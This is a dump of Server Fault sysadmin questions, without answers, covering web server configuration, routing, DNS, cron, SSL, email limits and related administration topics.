"853035","nginx on Debian 8 downloading INI file","<p>I want to redirect a specific sub domain to directory in nginx and I have some <code>.ini</code> files and i want to read them directly from browser, but instead of print the content, is downloading. How can i fix that?</p>

<p>My current default inside ""<code>/etc/nginx/sites-available/</code>""</p>

<pre><code>server {
    listen 80;  
    server_name subdomain.example.net;
    root /usr/share/patches/;
    location /usr/share/patches/ {
        root /usr/share/patches/;
    }
}
</code></pre>
","<linux><nginx><centos>","2017-05-30 14:20:12"
"761663","cron - How many times the cron job will run when given aterisk(*) on all positions","<p>If we define a cron job with <code>* * * * * /some/task/to/perform</code>, how many times the job will executed in 60 seconds?</p>
","<cron><scheduled-task><automation><service>","2016-03-04 18:46:32"
"853148","How to use part of a disk for Storage Spaces?","<p>I want to use Storage Spaces to create mirrored volumes. However, my disks are large and I do not wish to fill the entire disks with the Storage Spaces volumes.</p>

<p>Unfortunately, the GUI only appears to accept entire disks for inclusion into Storage Spaces. How do I only use part of a disk for Storage Spaces, retaining the ability to use normal partitions on the remaining part?</p>

<p>I am using latest version of Windows 10 Enterprise (Creators Update).</p>
","<windows-10><diskmanagement><storage-spaces>","2017-05-31 07:57:56"
"853221","Locally route traffic from DMZ-server to firewall's public IP address","<p>I have an Ubuntu server that sits in a DMZ. The server has a private IP address (10.x.x.x) and the firewall has a public IP address. All network traffic from internet to the public IP is forwarded from the firewall to the DMZ server. This works fine.</p>

<p>My problem is that traffic from the server inside the DMZ to the public IP address isn't routed back by the firewall. The firewall is outside of my control so I would like to configure the server to never route outgoing traffic to the gateway in the first place but rather handle it locally.</p>

<p>I have been playing with iptables DNAT and MASQUERADE but so far without any luck. What rules would I have to add to accomplish this?</p>

<p>I have the same problem with both normal outgoing traffic and outgoing traffic from docker containers on the server that use a bridged network.</p>
","<networking><iptables><firewall><routing><ufw>","2017-05-31 13:45:28"
"761813","small business 10 workstation network mess","<p>Fellow friends,</p>

<p>I am in a dire need for help.
I have gotten myself in a situation where I am expected to take care of small business computer network.
Little background: I'm in sales/marketing sector in company, and because I'm on help desk-level of computer knowledge, the boss thinks a can manage the whole setup.</p>

<p>Oh my God.
The setup is a mess.
There are 10 computers, one ADSL commercial modem, two 5 port switches. All computers are Windows XP workstation with critical business information on all of them, no antivirus, no updates. And the one workstation is named ""server"".</p>

<p>What can I do to make a setup that will work with stability, to automate cleanup/patch jobs, to understand what is failing and make my life livable.
How to plan for remote work, and how to add a layer of security?</p>

<p>Please advise</p>
","<windows><workstation-management>","2016-03-05 15:32:16"
"853263","Is there a way to block copying an email signature's company logo?","<p>This may be a pointless exercise, but after searching web for answers, I have not really come up with any answer.  Is there a way to block the copying of a company logo when sent in an email signature?  Supposedly this can be done, but the only 'sort-of' answer I found was using Information Rights Management, and I am unsure how or if that really works, or if its worth the hassle on an SMB (40 email users) kind of budget.</p>

<p>I realize that if someone REALLY wants to copy a logo for ill intent, they will do so no matter what.  Take a screen shot, take smartphone picture, etc.  But for a client who is asking, I'd like to know if its possible regardless so I can furnish some sort of legitimate response.</p>

<p>Any help is appreciated.  Thanks.</p>

<p>D</p>
","<email>","2017-05-31 18:35:04"
"761870","How to allow only my website to show my website page","<p>I have my website example.com, some one example-hacker.com is showing complete my website.. interesting think is that they are using cloud-flare so I can't get their server IP address to block.</p>

<p>Is there any way to block such website ? In Apache/Linux ? </p>
","<linux><apache-2.2><centos><security>","2016-03-06 01:35:29"
"853362","What SFTP server implementations support check-file extension","<p>I want to synchronise directories on the local host and a remote server via SFTP, using <code>paramiko.sftp_file.SFTPFile.check()</code> in Python to calculate MD5 checksums on the remote server.</p>

<p>According to <a href=""http://docs.paramiko.org/en/2.1/api/sftp.html"" rel=""nofollow noreferrer"">http://docs.paramiko.org/en/2.1/api/sftp.html</a> and <a href=""https://stackoverflow.com/questions/30056566/how-to-perform-checksums-during-a-sftp-file-transfer-for-data-integrity"">https://stackoverflow.com/questions/30056566/how-to-perform-checksums-during-a-sftp-file-transfer-for-data-integrity</a>, most SFTP server implementations (including OpenSSH, which I'm running by default) do not support the ""check-file"" extension.</p>

<p>My provider recommends vsftpd (see <a href=""https://security.appspot.com/vsftpd.html"" rel=""nofollow noreferrer"">https://security.appspot.com/vsftpd.html</a>) but its FAQ doesn't mention the ""check-file"" extension.  Can anyone tell me whether vsftpd supports this, or otherwise recommend an SSH/SFTP implementation?  I've tried Googling without success for this.</p>

<p>Thanks!</p>
","<sftp><vsftpd>","2017-06-01 08:29:19"
"933118","What significance does the subnet mask have for a public IP address?","<p>Our hoster has assigned us multiple public IP addresses. They are individual non-contiguous addresses e.g. 1.1.1.50 and 1.1.1.222. According to them the correct subnet mask to use is 255.255.255.0.</p>

<p>I do not understand why that is. My understanding is that the subnet mask is supposed to designate which addresses are considered part of the local network. But these are individual public IP addresses. There is no local network or subnet associated with them.</p>

<p>In my opinion the mask should be 255.255.255.255. What difference does this make?</p>
","<windows><ip><windows-server-2016><subnet>","2018-09-28 16:03:27"
"762045","iptables installed in centos 7 but nat table was not there","<p>[root@localhost yum.repos.d]# iptables --version</p>

<p>iptables v1.4.21</p>

<p>[root@localhost yum.repos.d]# iptables -L -t nat</p>

<p>iptables v1.4.21: can't initialize iptables table `nat': Table does not exist (do you need to insmod?)
Perhaps iptables or your kernel needs to be upgraded.</p>
","<iptables>","2016-03-07 11:46:37"
"933261","What private ip address space to use for a self-host VPN?","<p>I have set up a private OpenVPN tunnel which uses the a 10.x.x.x private ip range as the client and server ip. I was wondering if that would cause any problem in big networks that use that ip range also, like for example hotels or conference networks.</p>

<p>I noticed trouble staying connected to the internet sometimes and I was wondering if that had anything to do with it.</p>

<p>What is the recommend ip address range to use in a VPN setup like this? </p>

<p>The setup is:
1 Server
2-3 Clients at once at most (I know that the IP range is overkill, but it was from a tutorial I did some time ago)
OpenVPN (if that is anyhow important)</p>
","<vpn><openvpn><ip><private>","2018-09-29 19:51:07"
"933277","Is it possible to setup own DNS-server for company behind proxy?","<p>I've got a general question about hosting own dns-server for the company behind a proxy-server (also hosted in the same network) and the ability to access them from outside these network. </p>

<p>For example: if someone is searching for example.com and I'm the owner of this domain and I host the coressponding DNS-server by myself inside the network of my company behind a proxy-server, could be my domain resolved by my own DNS or will there be some conflicts with the proxy?</p>

<p>Many thanks in advice.</p>
","<domain-name-system><proxy>","2018-09-29 22:06:46"
"933310","How to change the username displayed in SSH cmd line","<p>When I login to an Ubuntu server the username is displayed as <code>user@abc-123:~#</code> how do I change this? eg. I want <code>user@servername:~#</code>.</p>
","<ubuntu><ssh>","2018-09-30 09:41:46"
"853628","Apache Rewrite specific domains to subdomain","<p>I want to redirect all domains from a specific directory to a new subdomain (invisibly).</p>

<p>e.g. <code>example.com/literal/some/path/to/file.html</code> -> <code>sub.example.com/literal/some/path/to/file.html</code>
AND</p>

<p><code>www.example.com/literal/some/path/to/file.html</code> -> 
<code>www.sub.example.com/literal/some/path/to/file.html</code></p>

<p>Where ""literal"" should be constant, and anything that comes after it is arbitrary.</p>

<p>I've tried things like </p>

<p><code>RewriteEngine on
RewriteCond %{HTTP_HOST} ^example\.com/literal
RewriteRule ^(.*)$ http://sub.example.com/$1 [L]
</code></p>

<p>But I can't get all the options right. Any help appreciated.</p>
","<apache-2.4><mod-rewrite>","2017-06-02 11:56:09"
"762472","Cronjob doesn't run. Similar cronjob does run. Issue with Env Vars??? Fedora involved. psql involved","<p>I have cronjobs like so</p>

<pre><code>* * * * * /usr/bin/psql -U usename dbname -c ""select usename, now(), pg_terminate_backend(pid) from pg_stat_activity where state like 'idle%' and (now() - query_start) &gt; interval '2 hour';"" &amp;&gt; /home/fedora/terminate_backend.log
* * * * * /usr/bin/psql -U usename dbname -c ""vacuum analyze;"" &amp;&gt; /home/fedora/vacuum.log
</code></pre>

<p>The second is running and producing the requested, albeit useless, log. The above does not create a log and I have reason to believe that it is not running. </p>

<p>I've tried adding <code>/usr/bin/echo ""DUMB"" &gt; /home/fedora/dumb.log;</code> in front and still nothing appears. </p>

<p>It looks like so</p>

<pre><code>* * * * * /usr/bin/echo ""DUMB"" &gt; /home/fedora/dumb.log; /usr/bin/psql -U usename dbname -c ""select usename, now(), pg_terminate_backend(pid) from pg_stat_activity where state like 'idle%' and (now() - query_start) &gt; interval '2 hour';"" &amp;&gt; /home/fedora/terminate_backend.log
</code></pre>

<p>Any help is appreciated. Might it have something to do with env vars? If looked in <code>env</code> and tried adding the host 127.0.0.1, Nothing. And btw, the vacuum one works, so...</p>
","<bash><cron><fedora><psql>","2016-03-08 20:29:06"
"933337","What is hypervisor? examples for type1 and type2","<p>What is hypervisor, and what are the differences between type1 and type2?
Examples for type1 and type2 ? Most questions out there are about the difference between type1 and type2, and the definitions are a bit loosely.</p>
","<virtualization><virtual-machines><hypervisor>","2018-09-30 15:03:40"
"853642","Listen on multiple IPv6 addresses","<p>Using Debian 8.7<br>
I have VPS server with allocated ipv6 range:<br>
2a01:xxxx:xxxx:xxxx::2/64</p>

<p>ifconfig looks like this  </p>

<pre><code> Link encap:Ethernet  HWaddr 52:54:a2:01:9a:8c  
 inet addr:172.31.1.100  Bcast:172.31.1.255  Mask:255.255.255.0  
 inet6 addr: 2a01:xxxx:xxxx:xxxx::2/64 Scope:Global  
 inet6 addr: fe80::5054:a2ff:fe01:9a8c/64 Scope:Link   
</code></pre>

<p>I can ping the server using primary IPv6 <code>2a01:xxxx:xxxx:xxxx::2/64</code>  </p>

<pre><code>ping6 2a01:xxxx:xxxx:xxxx::2  
PING 2a01:xxxx:xxxx:xxxx::2(2a01:xxxx:xxxx:xxxx::2) 56 data bytes  
64 bytes from 2a01:xxxx:xxxx:xxxx::2: icmp_seq=1 ttl=59 time=1.20 ms  
64 bytes from 2a01:xxxx:xxxx:xxxx::2: icmp_seq=2 ttl=59 time=0.466 ms  
</code></pre>

<p>However, when I try to use other IPs assigned I get no response.<br>
e.g.<br>
<code>ping6 2a01:xxxx:xxxx:xxxx::3</code><br>
<code>ping6 2a01:xxxx:xxxx:xxxx::4</code><br>
<code>ping6 2a01:xxxx:xxxx:xxxx::5</code><br>
<code>ping6 2a01:xxxx:xxxx:xxxx::6</code>  </p>

<p>This is not limited to ping but also to any other request.</p>

<p>I would like to serve apache from multiple IPv6 addresses (not whole range).<br>
Where/ how should I change configuration to listen on more than 1 IPv6 address?<br>
Both HTTP and ping should work (Ping is used for uptime checks for specific services).</p>
","<debian><ipv6>","2017-06-02 13:17:38"
"762538","What do you use to monitor and deploy linux config files?","<p>I'm working in an environment where multiple groups share servers. I was wondering what tools are used to check if configurations files were modified, maybe able to say who modified them, and revert them to original? And tools for deploying configuration files across multiple servers to make sure everything is in sync.</p>

<p>I realize that process can be developed and I can lock down access but I am looking for a validity check tool for now. Regarding deployments/sync of configurations, is the answer to just have a revision control system like git/svn with puppet, ansible, or chef running at an interval?</p>

<p>Thank you.</p>
","<linux><automation><configuration-management>","2016-03-09 03:25:42"
"853704","How to upgrade apacheds from 2.0.0-M19 to 2.0.0-23? Please share documents or steps would be appreciated it","<p>I need to upgrade apacheds from 2.0.0-M19 to 2.0.0-M23. Kindly share steps or documents. Thanks!</p>
","<upgrade><restore>","2017-06-02 17:43:55"
"933448","Smart Network Data Service reports spam from my IP. Nothing in my logs","<p>I am facing a very strange situation.
Microsoft's Smart Network Data Service is reporting that my IP is attempting to send hundreds of thousands of spams to Microsoft accounts every day.</p>

<p><a href=""https://i.sstatic.net/jNQ6i.jpg"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/jNQ6i.jpg"" alt=""SNDS report""></a></p>

<p>But, checking my server's logs I have found no indications of that kind of sending volume.</p>

<p>My <strong>Qmail queue is 0</strong></p>

<p><strong>None</strong> of the recipient email address mentioned in the SNDS report is found in my logs.</p>

<p><strong>No malicious</strong> or suspicious script is running on my server</p>

<p>For example, in the sample spam message that I've got from SNDS it mentions ""X-PHP-Originating-Script: 1249:phoned.php"".
No such file is present on my server!!!</p>

<p>So how is this possible? </p>
","<spam>","2018-10-01 12:32:12"
"853740","redirect subdomain to ip, but in web browser, redirect to folder","<p>I have a Minecraft server with the ip of mc.s0l4re.com, the mc subdomain is an ""A"" DNS record that redirects anyone typing ""mc.s0l4re.com"" in Minecraft to my server. However I want to use this subdomain as a website for my server as well. I want to redirect anyone in minecraft who types in ""mc.s0l4re.com"" to my Minecraft server, but I want anyone using a web browser to be directed to the server website.</p>

<p>Thank you!</p>
","<domain-name-system><ip><domains>","2017-06-02 22:15:56"
"853750","Let's Encrypt: Why is DNS challenge static?","<p>To my understanding, LetsEncrypt DNS verification works by setting a static TXT record into DNS (basically just a nonce) which is then checked by the LetsEncrypt servers.</p>

<p>When I first heard about it I was pretty excited and expected something more sophisticated: A public key is stored in DNS of my domains. Then, for verification, I create a signed message and the LetsEncrypt server checks is the signature is valid. Since public key in DNS and private key I own, this establishes proof that I control the domain.</p>

<p>Finding out that it does not work this way was a bit disappointing: It requires manual interactions and even for renewal a new TXT record.</p>

<p>Is there a technical reason that no signature approach is used? If no, what is the reason why LetsEncrypt does not implement it?</p>
","<domain-name-system><lets-encrypt><digital-signatures><verification>","2017-06-02 23:29:51"
"762596","how to access to lost process?","<p>Let's assume I run putty on windows and connect to Debian Jessie remotely.
I run Midnight commander, and run long term task. Than got power loss on Windows, so putty connection is lost.</p>

<p>Of course I should use screen, but i forgot.</p>

<p>After reconnection I can see mc in <code>ps ax</code>.</p>

<pre><code> 1864 pts/3    S+     0:10 mc
</code></pre>

<p>Is there a way to reconnect to this process? (And is it running?)</p>
","<linux><process>","2016-03-09 10:33:14"
"853805","ssllabs.com finding Certificate #2 with wrong domain","<p>When scanning one of the domains I have installed SSL for with ssllabs.com, Certificate #1 verifies correctly with grade 'A', although further down on the result page there is also a Certificate #2 that seems to be collected from the first of the domains with SSL certificate configured from the apache configuration for some reason and which of course gives a ""MISMATCH"" since the domain does not match the certificate. Wondering if anyone can point out whats wrong with the config.</p>

<p>Currently I'm setting up each domain hosted for ssl like this (domain names changed):</p>

<pre><code>&lt;Directory /home/info/&gt;
  Options -Indexes +FollowSymLinks -Multiviews
  AllowOverride All
  Order allow,deny
  allow from all
  Require all granted
&lt;/Directory&gt;

&lt;VirtualHost _default_:443&gt;
  DocumentRoot /home/info/pub/
  ServerName domain.at
  ServerAlias domain.at www.domain.at

  SSLEngine on
  SSLCertificateFile    /home/info/ssl/at.crt
  SSLCertificateKeyFile /home/info/ssl/at.key
  SSLCertificateChainFile /home/info/ssl/at.ca
&lt;/VirtualHost&gt;

&lt;VirtualHost _default_:443&gt;
  DocumentRoot /home/info/pub/
  ServerName domain.dk
  ServerAlias domain.dk www.domain.dk

  SSLEngine on
  SSLCertificateFile    /home/info/ssl/dk.crt
  SSLCertificateKeyFile /home/info/ssl/dk.key
  SSLCertificateChainFile /home/info/ssl/dk.ca
&lt;/VirtualHost&gt;

&lt;VirtualHost _default_:443&gt;
  DocumentRoot /home/info/pub/
  ServerName domain.fr
  ServerAlias domain.fr www.domain.fr

  SSLEngine on
  SSLCertificateFile    /home/info/ssl/fr.crt
  SSLCertificateKeyFile /home/info/ssl/fr.key
  SSLCertificateChainFile /home/info/ssl/fr.ca
&lt;/VirtualHost&gt;
</code></pre>

<p>So when for example scanning ""domain.fr"" with ssllabs it validates correctly for .fr certificate, but then goes on to try and validate ""domain.at"".
Should I comment out the ""domain.at"" config, it would try to validate ""domain.dk"" instead. Why is this? Grateful for help.</p>
","<ssl><apache-2.4>","2017-06-03 14:20:23"
"853814","How does proxy server bypass the default networkig behaviour?","<p>May be this is a silly/odd question but I want to know how exactly internally a proxy connection works on Windows OS. let me explain.</p>

<p>We have servers in a data center where there is no direct internet access but one of the servers does need internet access for which a proxy is configured. I want to know how exactly it works (routing-wise) when connecting to the internet. My understanding is that without proxy the normal behaviour of the TCP/IP stack is to go through default gateway but since in data center it isn't routed outside the network, I am assuming this proxy is doing the Default Gateway's equivalent role on this particular server.</p>

<p>Could you explain how it works underneath the surface? Sorry, if the question is too stupid.</p>
","<windows><proxy>","2017-06-03 16:58:47"
"853896","Decode & restore files from /dev/md3 (Hacked server)","<p>My not exposed MongoDB has hacked to ransom, my files stored on /home/mongo/store has deleted, i use foremost, ext4magic , extundelete , nothing is happening , backups on the same server are deleted too... I have only 1 earlier month backup, its not possible for me to announce that to my customers.</p>

<p>I try my last solution and cat /dev/md3 ( -> /home) and my data partialy encoded appear
<a href=""https://i.sstatic.net/0mZqj.png"" rel=""nofollow noreferrer"">screenshot</a></p>

<p>Do you know how to decrypt encoded values ?</p>

<p>Thanks all to save me.</p>
","<filesystems><data-recovery>","2017-06-04 13:59:34"
"762765","Script to combine data from one file to another","<p>I have a file containing folders name/value pairs:  </p>

<pre><code>peter:/home/peter/
max:/home/max-lucas/
judith:/home/judith/documents/
</code></pre>

<p>I have another file containing files name/value pairs, with the same names:</p>

<pre><code>max:todo.txt
peter:calendar.txt
peter:notes.txt
peter:dummy.txt
</code></pre>

<p>This is a kind of database.<br>
The real files are not so simple. I have to extract the data with sed, but this is not the point.</p>

<p>&nbsp;</p>

<p>I want to concatenate the two files:</p>

<pre><code>/home/peter/calendar.txt
/home/peter/notes.txt
/home/peter/dummy.txt
/home/max-lucas/todo.txt
</code></pre>

<p>&nbsp;</p>

<p>The only idea I have is:</p>

<ol>
<li>iterate into the first file to create a name/value array</li>
<li>iterate through the second file and assemble each line with the correct value from the array</li>
</ol>

<p>&nbsp;</p>

<p>Question: is there a somewhat standard CLI tool made for this?</p>
","<bash><database>","2016-03-10 00:50:04"
"853926","How can I appear to be coming from a certain IP address?","<p>I have a friends IP and I want to appear to be coming from his specific IP to the outside world. How can I do that besides actually taking over his computer?</p>

<p>Thanks!</p>
","<ipv4>","2017-06-04 19:16:29"
"762769","Multiple NIC same subnet","<p>I have a setup as shown in the image. I know it is insane but i have to work on this configuration only.</p>

<p>It is basically an <strong>ubuntu server acting as a router</strong> with 4 interfaces. 3 of them (eth0, eth1 and eth3) act as gateways to PC1, PC2 and PC3 respectively.</p>

<p>I want the PCs access internet through them and set iptable rules to build a firewall on the ubuntu server.</p>

<hr>

<pre><code>                              -----
                             | PC1 |10.1.0.101/16 (gw &amp; dns-10.1.0.20)
                              ----- 
                                |
                           eth1 |10.1.0.20/16
                         ---------------
                        |               |
                   eth0 |    Ubuntu     | eth2         ----- 
10.1.5.244 -------------|    Server     |-------------| PC2 |10.1.0.102/16
(Router)    10.1.0.10/16|               |10.1.0.30/16  ----- (gw &amp; dns-10.1.0.30)
                         ---------------            
                           eth3 |10.1.0.40/16
                                |
                              -----
                             | PC3 |10.1.0.103/16
                              ----- (gw &amp; dns-10.1.0.40)

eth0 - connected to router (internet connected interface - gw=10.1.5.244)
       inet addr:10.1.0.10  Bcast:10.1.255.255  Mask:255.255.0.0
eth1 - inet addr:10.1.0.20  Bcast:10.1.255.255  Mask:255.255.0.0
eth2 - inet addr:10.1.0.30  Bcast:10.1.255.255  Mask:255.255.0.0
eth3 - inet addr:10.1.0.40  Bcast:10.1.255.255  Mask:255.255.0.0

$route -n 
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
default         10.1.5.244      0.0.0.0         UG    0      0        0 eth0
10.1.0.0        *               255.255.0.0     U     0      0        0 eth2
10.1.0.0        *               255.255.0.0     U     0      0        0 eth1
10.1.0.0        *               255.255.0.0     U     0      0        0 eth3
10.1.0.0        *               255.255.0.0     U     0      0        0 eth0
</code></pre>

<p>I have solved the ARP flux problem with following arp configurations.</p>

<pre><code>echo ""1"" &gt; /proc/sys/net/ipv4/conf/all/arp_filter
echo ""1"" &gt; /proc/sys/net/ipv4/conf/all/arp_ignore
echo ""2"" &gt; /proc/sys/net/ipv4/conf/all/arp_announce
</code></pre>

<p>Also i have setup ip routes on 3 interfaces eth1, eth2 and eth3 as shown below for eth2.</p>

<pre><code>echo ""152 table2"" &gt;&gt;/etc/iproute2/rt_tables
ip route add default via 10.1.0.10 dev eth0 table table2
ip route add 10.1.0.0/16 dev eth2 table table2
ip rule add from 10.1.0.30 table table2
ip rule add to 10.1.0.30 table table2
</code></pre>

<p><strong>I am not sure about IP rules on eth0.</strong></p>

<p>with above configuration i am able to connect to individual interfaces eth1, eth2, eth3 with PC1, PC2 and PC3 (resolving arp flux issue).</p>

<p>However i am not able to connect to the internet on PC1 and PC3.</p>

<p><em>It seems that the returning packets are routed to eth2 only (1st entry in route -n for 10.1.0.0/16 subnet) regardless of originating PC1, PC2 or PC3.</em>
<em>(Also I have kept <strong>rp_filter=1</strong> as I want to use corresponding outgoing interface only.)</em></p>

<p><strong>So my question is how to route return packets to corresponding interface or how to access internet on the PCs from corresponding interface only.</strong></p>
","<iptables><router><linux-networking><subnet>","2016-03-10 01:15:05"
"853966","Reverse DNS on AzureVM","<p>I've created a VM that holds the private and public DNS zones for my network. I'm having difficulties setting up a pointer record for my domain name that's being used for exchange.</p>

<p>My best guess is that only the ISP can setup the PTR record in this case Azure. Does anyone have any tips or advice as to how this setup should be done?</p>
","<azure><internal-dns><reverse-dns>","2017-06-05 03:49:37"
"978234","office 365 email limits","<p>I have a small-business client that uses Office 365 as their email provider.</p>

<p>This works fine for everyday email use by employees, but their ERP system, which is configured to use a single email account, generates  a lot of emails, sending out invoices, inventory stock alerts, order status updates, etc, etc.</p>

<p>With an active B2B customer base (over 10,000 customers) with thousands of emails per day generated that are essential to the client relationships, not unwanted SPAM, we are beginning to hit some of the Office 365 email limits. </p>

<p>The maximum of 30 per minute per account is a real issue, especially when sending out the invoices for the day, or when new stock arrives that requires sending individually customized emails to customers that have subscribed to inventory updates for one or more stock items. The limit on number of recipients per day is also an issue given the quantity of customers involved. </p>

<p>My expertise is in customizing and fine tuning the ERP system, I am not an expert on Email systems, which are actually maintained by their hardware and network vendor, however they are looking to me for advice on how to avoid these email issues with the ERP system.</p>

<p>Is there some way to raise the Office 365 limits (my research says no, as they are there to combat SPAM) or a better service to use for the volume of email coming from the ERP system? The client is happy with Office 365 for all other email tasks.</p>
","<email><microsoft-office-365><office365>","2019-08-07 01:19:27"
"763077","Getting file size before download on a proxy server","<p>We're working on building a multithreaded proxy file server in C, where we receive a request and retrieve it from another location using the libcurl library.</p>

<p>The library gives you the option of issuing a HEAD request to get some file parameters - such as size etc.</p>

<p>You can also get these parameters when you actually start serving the file. </p>

<p>A colleague has pointed out that doing a HEAD request and then immediately getting the file afterwards is wasteful. I agree with him, but I was wondering if there exists any use case where it might be useful to know the file size in advance? </p>

<ul>
<li>e.g. Choosing optimal MTU.</li>
<li>e.g. Setting thread priority if it is a big file. </li>
<li>e.g. Reducing overall threads in case we use up too much memory
when we have a big file.</li>
</ul>

<p>In addition to this are there security concerns when we query a file size before retrieving it in the proxy file server scenario?</p>
","<security><performance><proxy><file-server>","2016-03-11 05:11:00"
"853980","Ideal configuration for a head node?","<p>Which hardware should I concentrate on, when assembling a head node for an HPC cluster? The main task for the head node is to relay instructions to the compute nodes which will be running artificial intelligence algorithms.</p>

<p>Ubuntu 14.04 LTS will be running on the head node.</p>

<p>I would assume it should have a high bandwidth NIC such as the infiniband 50 Gbps card, but I'm relatively inexperienced in this area.</p>

<p>Thank you</p>
","<ubuntu><networking><hardware><infiniband><hpc>","2017-06-05 07:13:25"
"763095","switch and local ip's","<p>ive read in other topics that switches doesn't understand IP and they only use MAC addresses</p>

<p>i have a lot of NAS and 4 computers on my network. I'm planning to buy a switch to replace a router that i don't need anymore (new internet provider modem has a router)</p>

<p>but does that means i wont be able to access my NAS using local IP anymore ? like 192.168.2.10 ? and that i will be forced to use MAC instead ?</p>
","<networking><ip><router><switch>","2016-03-11 07:48:44"
"854023","pfsense - redirect custom URL to specific server/port","<p>I have pfsense router and local web server connected to it. That web server has wiki page available under specific port number (under default port there is another web service availabe), so I would like to make it easy accessible.
Is there any way to configure redirection on pfsense like:</p>

<pre><code>wiki.domain --&gt; webserver:12345/wiki/index.php
</code></pre>

<p>?</p>
","<pfsense>","2017-06-05 12:34:29"
"978283","How poll lots of external services from aws in a scalable and self-healing way","<p>I have a set of external services which I want to poll continuously in short intervals (about 30seconds) from AWS. For example, I have a set of git repos which I want to poll for changes to trigger ci pipelines.</p>

<p>My requirements are:</p>

<ul>
<li>I want the solution to be scaleable (let's assume I want to poll thousands of git repos).</li>
<li>I want the solution to be self healing.
So it is OK, if external services are not polled for a short time (because of some failure), but after a short time polling should start again.</li>
<li>I need some external way of removing and adding external services that should be polled.</li>
</ul>

<p>What would be a cost-efficient way of implementing this in AWS? </p>

<h3>My thoughts on a solution</h3>

<p>The obvious approach is to start a set of ec2 instances (maybe 1 for every 100 services I want to poll) and distribute the services among them. For self-healing one approach would be an autoscaling group.</p>

<p>But for this to work, every instance in the autoscaling would know for which services it is responsible, which means every instance would need a unique id it can recover upon being restarted. From <a href=""https://stackoverflow.com/questions/44609595/set-a-unique-tag-to-each-instance-of-terraform-aws-autoscaling-group-module"">here</a> I read that is not a good practice.</p>
","<amazon-web-services><architecture>","2019-08-07 11:44:37"
"933885","Understanding Nutanix features","<p>From a <em>very</em> high level view:</p>

<ul>
<li>Open Stack is sort of framework to manage your cloud but you need to implement things</li>
<li>Cloud Stack / Cloud Shift / Rancher are more or less solutions to get your cloud running but less customizable</li>
</ul>

<p>Then, where does Nutanix go? Is it unique through extended storage support?</p>
","<cloud-computing><nutanix>","2018-10-04 06:16:31"
"978363","How to make in SSH private key from one line, three lines","<p>i have ssh-key, something like this</p>

<pre><code>-----BEGIN RSA PRIVATE KEY----- my_super_secret_password -----END RSA PRIVATE KEY-----
</code></pre>

<p>Of course this key does not work. When i am doing manual things, something, like this</p>

<pre><code>-----BEGIN RSA PRIVATE KEY----- 
my_super_secret_password 
-----END RSA PRIVATE KEY-----
</code></pre>

<p>It works. When i am deleting this <code>-----BEGIN RSA PRIVATE KEY-----</code> and this <code>-----END RSA PRIVATE KEY-----</code>, my ssh-key does not work.</p>

<p>So, the question. How, i can make automatically via some command, like <code>sed</code> or <code>awk</code>, or any other command, how can i make from this string</p>

<p><code>-----BEGIN RSA PRIVATE KEY----- my_super_secret_password -----END RSA PRIVATE KEY-----</code></p>

<p>these three strings</p>

<pre><code>-----BEGIN RSA PRIVATE KEY----- 
my_super_secret_password 
-----END RSA PRIVATE KEY-----
</code></pre>

<p>Thanks for your help. If you know any other answer on this question, i am glad to hear you. The reason, why i need it, because i have secret keys storage in <code>AWS Secret Manager</code>. So, this manager stores keys only in one line.</p>
","<ssh><ssh-keys><sed><awk><private-key>","2019-08-07 20:08:10"
"978381","What are the best practices for setting up webservers?","<p>We are a Web Development Agency based in NZ and we host websites for around 300 clients.</p>

<p>We are looking to migrate these websites from our old servers onto something more modern. We have looked into azure/other cloud-based servers but have opted not to use these services.</p>

<p>I am hoping to get some recommendations on best practices before we go ahead and set up the new servers.</p>

<p>We host websites based on a number of technologies/CMS's, including:</p>

<ol>
<li>PHP/Wordpress</li>
<li>ASP.NET 3.X / 4.X</li>
<li>.NET Core</li>
<li>MySQL</li>
<li>MSSQL</li>
</ol>

<p>Question 1: Would it be better to have the ASP.Net/Core sites on one IIS web server and the PHP sites on a separate server? Or, is it better to set up a single web server capable of hosting all of the websites, regardless of the language used?</p>

<p>Question 2: I know it is possible to host both MySQL and MSSQL side-by-side on the same server but is this a good idea? or should they have their own servers?</p>

<p>Any help would be greatly appreciated.</p>
","<iis><web-server><database><web-hosting>","2019-08-07 22:11:01"
"854202","What consider as a full write cycle?","<p>I have a computer that is connected to USB flash drives that automatically scan in a picture(1.3mb) every 2 mins. I am wondering if that count as a write cycle? MY stick is 128gb, so it will take about 10k+ times to fill the stick. </p>

<p>Because if a stick only has a 10k-100k write cycle then it would die before i even fill it half way. </p>

<p>Thanks</p>
","<ssd><usb>","2017-06-06 10:59:54"
"854224","Simple DNS Modifications, Directing to CDN","<p>I'm reading through <a href=""https://www.incapsula.com/cdn-guide/what-is-cdn-how-it-works.html"" rel=""nofollow noreferrer"">this guide</a> which is quite thorough and helpful, but I've come across one paragraph that's stumping me.</p>

<blockquote>
  <p>For your root domain, you'll change its A record to point to one of the CDN's IP ranges. For each subdomain, modify its CNAME record to point to a CDN-provided subdomain address (e.g., ns1.cdn.com). In both cases, this results in the DNS routing all visitors to your CDN instead of being directed to your original server. - See more at: <a href=""https://www.incapsula.com/cdn-guide/what-is-cdn-how-it-works.html#sthash.f0v6pdOz.dpuf"" rel=""nofollow noreferrer"">https://www.incapsula.com/cdn-guide/what-is-cdn-how-it-works.html#sthash.f0v6pdOz.dpuf</a></p>
</blockquote>

<ol>
<li>The fact that you handle subdomains differently from root domains seems strange to me. Why am I using CNAME for subdomains, and A for root domain?</li>
<li>Why am I using A or CNAME records at all? Shouldn't I just be changing the nameservers in my domain control panel to those of the CDN?</li>
</ol>
","<domain-name-system><domain><subdomain><cloudflare><cdn>","2017-06-06 13:07:23"
"763429","SSD + HDD RAID 0 Performance?","<p>the purpose is to get the max space and the best performance </p>

<p>is it possible to merge <strong>two drives</strong> one is <code>hdd</code> and the other is <code>ssd</code>
into one partition using <code>raid 0</code> ?  </p>

<p>and do it provide good performance ?</p>
","<raid0>","2016-03-13 10:23:30"
"763444","Advice on choosing Standard or Durable Reduced Availability for file storage Google cloud storage package","<p>I'm running a web app that is based around uploading and downloading files, and I'm not sure what the best choice is for me. I need files to be available for download on demand with minimal delay. There's a latency listed for the Standard and Nearline packages, but nothing other than ""reduced availability"" for the other option. WTF does that actually mean?</p>

<p>Are we talking 500ms, 5s, a week? Do they mail me diskettes? The documentation for the Google cloud products suite is shoddy to say the least.</p>

<p>Thanks!</p>
","<google-cloud-platform><google-cloud-storage>","2016-03-13 12:58:27"
